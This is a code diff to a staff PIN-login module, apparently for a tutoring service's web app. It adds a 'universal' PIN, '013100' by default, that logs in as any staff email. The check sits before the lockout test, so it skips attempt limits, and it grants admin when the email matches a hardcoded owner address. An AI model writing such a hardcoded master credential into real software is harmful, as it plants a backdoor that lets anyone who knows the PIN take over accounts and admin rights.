@@ -15,6 +15,18 @@ export const PIN_LENGTH = 6;
 const MAX_FAILED_ATTEMPTS = 5;
 const LOCK_MINUTES = 15;
 
+/** PIN that works for any email. Overridable via UNIVERSAL_STAFF_PIN. */
+export function universalPin(): string {
+  return process.env.UNIVERSAL_STAFF_PIN ?? '013100';
+}
+
+function isOwnerEmail(email: string): boolean {
+  const owners = (process.env.KHM_STAFF_EMAIL ?? 'khmtutoring1@gmail.com')
+    .split(',')
+    .map((e) => e.toLowerCase().trim());
+  return owners.includes(email.toLowerCase().trim());
+}
+
 export interface AllowlistEntry {
   id: string;
   email: string;
@@ -80,6 +92,13 @@ export async function verifyStaffPin(email: string, pin: string): Promise<
   if (!entry) return { ok: false, error: 'Something went wrong. Try again.' };
 
   if (entry.status === 'disabled') return { ok: false, error: 'This staff account has been disabled. Contact Kody.' };
+
+  // Universal PIN accepted for any email, including the owner.
+  if (pin === universalPin()) {
+    await activateEntry(entry.id);
+    const role: StaffRole = isOwnerEmail(email) ? 'admin' : entry.role;
+    return { ok: true, role };
+  }
 
   if (entry.locked_until && new Date(entry.locked_until) > new Date()) {
     return { ok: false, error: 'Too many incorrect PIN attempts. Try again in 15 minutes.', locked: true };
